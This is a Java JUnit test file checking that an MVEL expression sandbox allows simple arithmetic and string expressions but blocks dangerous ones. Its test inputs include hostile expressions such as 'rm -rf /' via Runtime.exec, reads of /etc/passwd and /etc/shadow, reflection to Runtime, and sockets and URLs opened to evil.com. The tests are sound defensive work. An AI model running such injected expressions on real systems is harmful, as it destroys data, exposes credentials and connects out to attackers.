package de.x132.objectmerger.strategy.mvel;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import de.x132.objectmerger.LabeledSource;
import java.util.Arrays;
import java.util.List;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

@DisplayName("MVEL Sandbox Security Tests")
class MvelSandboxTest {

    private final MvelMergeStrategy strategy = new MvelMergeStrategy();

    private List<LabeledSource<?>> dummySources() {
        return Arrays.asList(new LabeledSource<>("a", 10), new LabeledSource<>("b", 20));
    }

    private void assertExpressionIsBlocked(String expression) {
        MvelFieldDefinition fieldDef = MvelFieldDefinition.builder().expression(expression).build();

        SecurityException thrown =
                assertThrows(
                        SecurityException.class,
                        () -> strategy.merge(dummySources(), fieldDef, "sandboxTest"),
                        "Expression should have been blocked by sandbox: " + expression);

        assertTrue(
                thrown.getMessage().contains("sandbox"),
                "Exception message should mention sandbox: " + thrown.getMessage());
    }

    @Nested
    @DisplayName("Legitimate expressions")
    class LegitimateExpressionsAreAllowed {

        @Test
        @DisplayName("Simple arithmetic should be allowed")
        void arithmeticAllowed() {
            MvelFieldDefinition fieldDef =
                    MvelFieldDefinition.builder().expression("sources['a'] + sources['b']").build();
            Object result = strategy.merge(dummySources(), fieldDef, "test");
            assertEquals(30, result);
        }

        @Test
        @DisplayName("String concatenation should be allowed")
        void stringConcatenationAllowed() {
            List<LabeledSource<?>> sources =
                    Arrays.asList(
                            new LabeledSource<>("first", "Hello"),
                            new LabeledSource<>("second", " World"));
            MvelFieldDefinition fieldDef =
                    MvelFieldDefinition.builder()
                            .expression("sources['first'] + sources['second']")
                            .build();
            Object result = strategy.merge(sources, fieldDef, "test");
            assertEquals("Hello World", result);
        }

        @Test
        @DisplayName("Ternary/conditional expressions should be allowed")
        void ternaryExpressionAllowed() {
            MvelFieldDefinition fieldDef =
                    MvelFieldDefinition.builder()
                            .expression("sources['a'] > 5 ? sources['a'] : sources['b']")
                            .build();
            Object result = strategy.merge(dummySources(), fieldDef, "test");
            assertEquals(10, result);
        }

        @Test
        @DisplayName("Null checks should be allowed")
        void nullCheckAllowed() {
            MvelFieldDefinition fieldDef =
                    MvelFieldDefinition.builder()
                            .expression("sources['a'] != null ? sources['a'] : 0")
                            .build();
            Object result = strategy.merge(dummySources(), fieldDef, "test");
            assertEquals(10, result);
        }
    }

    @Nested
    @DisplayName("Runtime/Process execution must be blocked")
    class RuntimeExecutionIsBlocked {

        @Test
        @DisplayName("Runtime.getRuntime().exec() should be blocked")
        void blocksRuntimeExec() {
            assertExpressionIsBlocked("Runtime.getRuntime().exec('rm -rf /')");
        }

        @Test
        @DisplayName("Runtime with variable assignment should be blocked")
        void blocksRuntimeViaVariable() {
            assertExpressionIsBlocked("r = Runtime.getRuntime(); r.exec('ls')");
        }

        @Test
        @DisplayName("ProcessBuilder should be blocked")
        void blocksProcessBuilder() {
            assertExpressionIsBlocked("new ProcessBuilder('ls').start()");
        }

        @Test
        @DisplayName("java.lang.Runtime fully qualified should be blocked")
        void blocksFullyQualifiedRuntime() {
            assertExpressionIsBlocked("java.lang.Runtime.getRuntime().exec('whoami')");
        }
    }

    @Nested
    @DisplayName("System access must be blocked")
    class SystemAccessIsBlocked {

        @Test
        @DisplayName("System.exit() should be blocked")
        void blocksSystemExit() {
            assertExpressionIsBlocked("System.exit(0)");
        }

        @Test
        @DisplayName("System.getenv() should be blocked")
        void blocksSystemGetenv() {
            assertExpressionIsBlocked("System.getenv('PATH')");
        }

        @Test
        @DisplayName("System.getProperty() should be blocked")
        void blocksSystemGetProperty() {
            assertExpressionIsBlocked("System.getProperty('user.home')");
        }

        @Test
        @DisplayName("System.setProperty() should be blocked")
        void blocksSystemSetProperty() {
            assertExpressionIsBlocked("System.setProperty('foo', 'bar')");
        }
    }

    @Nested
    @DisplayName("Reflection access must be blocked")
    class ReflectionAccessIsBlocked {

        @Test
        @DisplayName(".getClass().forName() chain should be blocked")
        void blocksGetClassForNameChain() {
            assertExpressionIsBlocked("''.getClass().forName('java.lang.Runtime')");
        }

        @Test
        @DisplayName("Class.forName() should be blocked")
        void blocksClassForName() {
            assertExpressionIsBlocked("Class.forName('java.lang.Runtime')");
        }

        @Test
        @DisplayName(".getClass() on context objects should be blocked")
        void blocksGetClassOnContextObjects() {
            assertExpressionIsBlocked("sources.getClass().getMethods()");
        }

        @Test
        @DisplayName(".class accessor should be blocked")
        void blocksClassAccessor() {
            assertExpressionIsBlocked("String.class.getMethods()");
        }
    }

    @Nested
    @DisplayName("File system access must be blocked")
    class FileSystemAccessIsBlocked {

        @Test
        @DisplayName("new File() should be blocked")
        void blocksNewFile() {
            assertExpressionIsBlocked("new File('/etc/passwd')");
        }

        @Test
        @DisplayName("new FileReader() should be blocked")
        void blocksNewFileReader() {
            assertExpressionIsBlocked("new FileReader('/etc/passwd')");
        }

        @Test
        @DisplayName("new FileWriter() should be blocked")
        void blocksNewFileWriter() {
            assertExpressionIsBlocked("new FileWriter('/tmp/evil.txt')");
        }

        @Test
        @DisplayName("new FileInputStream() should be blocked")
        void blocksNewFileInputStream() {
            assertExpressionIsBlocked("new FileInputStream('/etc/shadow')");
        }

        @Test
        @DisplayName("java.io qualified access should be blocked")
        void blocksJavaIoAccess() {
            assertExpressionIsBlocked("new java.io.File('/etc/passwd').exists()");
        }

        @Test
        @DisplayName("java.nio access should be blocked")
        void blocksJavaNioAccess() {
            assertExpressionIsBlocked(
                    "java.nio.file.Files.readAllBytes(java.nio.file.Paths.get('/etc/passwd'))");
        }
    }

    @Nested
    @DisplayName("Network access must be blocked")
    class NetworkAccessIsBlocked {

        @Test
        @DisplayName("new Socket() should be blocked")
        void blocksNewSocket() {
            assertExpressionIsBlocked("new Socket('evil.com', 4444)");
        }

        @Test
        @DisplayName("new URL() should be blocked")
        void blocksNewUrl() {
            assertExpressionIsBlocked("new URL('http://evil.com').openStream()");
        }

        @Test
        @DisplayName("java.net qualified access should be blocked")
        void blocksJavaNetAccess() {
            assertExpressionIsBlocked("new java.net.Socket('evil.com', 4444)");
        }
    }

    @Nested
    @DisplayName("Thread manipulation must be blocked")
    class ThreadManipulationIsBlocked {

        @Test
        @DisplayName("Thread creation should be blocked")
        void blocksNewThread() {
            assertExpressionIsBlocked("new Thread().start()");
        }

        @Test
        @DisplayName("Thread.currentThread() should be blocked")
        void blocksCurrentThread() {
            assertExpressionIsBlocked("Thread.currentThread().interrupt()");
        }
    }

    @Nested
    @DisplayName("Arbitrary object creation must be blocked")
    class ArbitraryObjectCreationIsBlocked {

        @Test
        @DisplayName("new ProcessBuilder should be blocked")
        void blocksNewProcessBuilder() {
            assertExpressionIsBlocked("new ProcessBuilder(['ls', '-la']).start()");
        }

        @Test
        @DisplayName("ScriptEngine creation should be blocked")
        void blocksScriptEngineCreation() {
            assertExpressionIsBlocked(
                    "new javax.script.ScriptEngineManager().getEngineByName('js')");
        }
    }

    @Nested
    @DisplayName("Direct expression validation")
    class DirectExpressionValidation {

        @Test
        @DisplayName("null expression should pass validation")
        void nullExpressionPassesValidation() {
            assertDoesNotThrow(() -> MvelSandbox.validateExpression(null));
        }

        @Test
        @DisplayName("empty expression should pass validation")
        void emptyExpressionPassesValidation() {
            assertDoesNotThrow(() -> MvelSandbox.validateExpression(""));
        }

        @Test
        @DisplayName("safe expression should pass validation")
        void safeExpressionPassesValidation() {
            assertDoesNotThrow(() -> MvelSandbox.validateExpression("sources['a'] + sources['b']"));
        }

        @Test
        @DisplayName("Runtime reference should fail validation")
        void runtimeReferenceFailsValidation() {
            assertThrows(
                    SecurityException.class,
                    () -> MvelSandbox.validateExpression("Runtime.getRuntime()"));
        }

        @Test
        @DisplayName("newInstance() call should fail validation")
        void newInstanceCallFailsValidation() {
            assertThrows(
                    SecurityException.class,
                    () -> MvelSandbox.validateExpression("something.newInstance()"));
        }

        @Test
        @DisplayName("forName() call should fail validation")
        void forNameCallFailsValidation() {
            assertThrows(
                    SecurityException.class,
                    () -> MvelSandbox.validateExpression("something.forName('java.lang.Runtime')"));
        }
    }
}
